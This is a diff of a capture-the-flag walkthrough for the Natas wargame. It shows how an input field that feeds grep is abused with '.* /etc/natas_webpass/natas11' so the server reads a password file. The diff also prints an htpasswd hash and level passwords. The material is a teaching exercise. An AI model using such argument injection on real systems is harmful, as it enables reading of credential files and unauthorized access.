@@ -21,13 +21,23 @@ if($key != "") {       
 
 So the concept is going to be the same as the last level, but we need to come up with a more creative way of injecting our commands
 
-I tried inserting a wildcard character (`.*`) into this as `grep` does support wildcard characters and I got this output:
+`grep` can allow us to read from multiple files at the same time. So if I try to grep the letter `a` and input a file path like `/etc/natas_webpass/natas11`, I'll be able to grep that letter from both `dictionary.txt` and `/etc/natas_webpass/natas11`.
+
+Of course, this won't always work. What if the password doesn't have an `a` in it. So we could use the wildcard character `.*`. The `*` is just a repetition operator, but we need to tell it what to repeat. The `.` means any character. So the full injection is:
+
+```
+.* /etc/natas_webpass/natas11
+```
+
+Giving us this output:
+
 ```
 .htaccess:AuthType Basic
 .htaccess: AuthName "Authentication required"
 .htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
 .htaccess: require valid-user
-.htpasswd:natas10:$apr1$t6bjsq8a$xpGFjsUmCvTZohx70DGXg/
+.htpasswd:natas10:$apr1$BJulC6vU$XnGaMp0g7Mt56BsyHiQ8l0
+/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
 dictionary.txt:African
 dictionary.txt:Africans
 dictionary.txt:Allah
@@ -37,24 +47,7 @@ dictionary.txt:Americanism
 dictionary.txt:Americanism's
 dictionary.txt:Americanisms
 dictionary.txt:Americans
-...
-```
-
-The wildcard character is working. `grep` is grepping all the files with `.` in its name.
-
-So I tried inserting the password file path into the input field so that `grep` can read it: `.* /etc/natas_webpass/natas11`. And this is the output:
-```
-.htaccess:AuthType Basic
-.htaccess: AuthName "Authentication required"
-.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
-.htaccess: require valid-user
-.htpasswd:natas10:$apr1$t6bjsq8a$xpGFjsUmCvTZohx70DGXg/
-/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
-dictionary.txt:African
-dictionary.txt:Africans
-dictionary.txt:Allah
-dictionary.txt:Allah's
-dictionary.txt:American
-dictionary.txt:Americanism
-...
+dictionary.txt:April
+dictionary.txt:April's
+dictionary.txt:Aprils
 ```
